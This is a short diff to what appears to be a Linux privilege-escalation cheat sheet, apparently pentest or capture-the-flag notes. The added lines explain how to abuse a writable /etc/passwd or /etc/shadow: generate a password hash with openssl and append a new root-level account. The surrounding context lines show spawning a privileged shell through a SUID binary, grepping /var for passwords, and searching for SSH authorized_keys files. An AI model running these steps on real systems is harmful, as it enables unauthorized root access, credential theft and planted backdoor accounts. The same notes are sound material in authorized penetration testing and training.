@@ -239,6 +239,14 @@ use binary to exec /bin/bash -p
 search for strings (search for username if scripts aren't picking up creds):
 
     grep -rwl "password" /var     
+   
+### Writeable /etc/passwd or /etc/shadow
+
+    openssl passwd -1 -salt [username] [password]
+
+Append to /etc/passwd or /etc/shadow
+
+    Username:encrypted_password:UID:GUID:root:/root:/bin/bash
 
 ### SSH Keys   
     find / -name authorized_keys 2> /dev/null
